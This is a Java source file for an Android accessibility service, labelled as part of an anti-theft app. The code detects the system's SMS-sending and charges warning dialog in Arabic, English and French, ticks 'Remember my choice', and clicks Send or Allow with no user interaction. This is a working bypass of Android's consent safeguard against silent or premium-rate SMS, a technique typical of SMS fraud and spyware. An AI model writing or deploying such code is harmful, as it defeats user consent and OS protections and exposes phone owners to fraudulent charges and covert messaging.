package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

/**
 * DroidGuard Auto-Confirm Accessibility Service
 * Automatically detects the Android OS "سيرسل رسالة SMS" (Send SMS confirmation / rate limit)
 * dialog and clicks the positive "إرسال" (Send) button instantly without user interaction.
 */
public class AutoConfirmService extends AccessibilityService {
    private static final String TAG = "AutoConfirmService";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null && event != null) {
            rootNode = event.getSource();
        }
        if (rootNode == null) return;

        try {
            boolean isSmsWarningDialog = false;

            // 1. Search for keywords in Arabic, English, and French that indicate the SMS confirmation dialog
            String[] warningKeywords = new String[] {
                "سيرسل رسالة SMS",
                "سيرسل رسالة",
                "رسالة SMS",
                "رسوم",
                "send an SMS",
                "sending an SMS",
                "enverra un SMS",
                "envoyer un SMS"
            };

            for (String kw : warningKeywords) {
                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(kw);
                if (nodes != null && !nodes.isEmpty()) {
                    isSmsWarningDialog = true;
                    Log.i(TAG, "Detected SMS confirmation dialog via keyword: " + kw);
                    break;
                }
            }

            // 2. If it is the SMS dialog or if button1 exists in an alert dialog
            if (isSmsWarningDialog) {
                // If there's a "Remember my choice" / "تذكر خياري" checkbox, select it first
                try {
                    List<AccessibilityNodeInfo> checkboxes = rootNode.findAccessibilityNodeInfosByViewId("android:id/check");
                    if (checkboxes != null) {
                        for (AccessibilityNodeInfo cb : checkboxes) {
                            if (cb.isCheckable() && !cb.isChecked()) {
                                cb.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                Log.i(TAG, "Checked 'Remember my choice' option.");
                            }
                        }
                    }
                } catch (Exception ignored) {}

                // Priority 1: Find standard Android positive button (button1)
                List<AccessibilityNodeInfo> positiveButtons = rootNode.findAccessibilityNodeInfosByViewId("android:id/button1");
                if (positiveButtons != null && !positiveButtons.isEmpty()) {
                    for (AccessibilityNodeInfo btn : positiveButtons) {
                        if (clickNodeOrParent(btn)) {
                            Log.i(TAG, "Auto-clicked positive button1 (Send SMS) successfully!");
                            return;
                        }
                    }
                }

                // Priority 2: Find button by text
                String[] sendTexts = new String[] { "إرسال", "ارسال", "Send", "Envoyer", "السماح", "Allow" };
                for (String sendText : sendTexts) {
                    List<AccessibilityNodeInfo> buttons = rootNode.findAccessibilityNodeInfosByText(sendText);
                    if (buttons != null && !buttons.isEmpty()) {
                        for (AccessibilityNodeInfo btn : buttons) {
                            if (clickNodeOrParent(btn)) {
                                Log.i(TAG, "Auto-clicked send button via text '" + sendText + "' successfully!");
                                return;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Error in onAccessibilityEvent: " + e.getMessage());
        }
    }

    private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            if (parent.isClickable()) {
                return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            AccessibilityNodeInfo grandParent = parent.getParent();
            if (grandParent != null && grandParent.isClickable()) {
                return grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "AutoConfirmService interrupted.");
    }
}
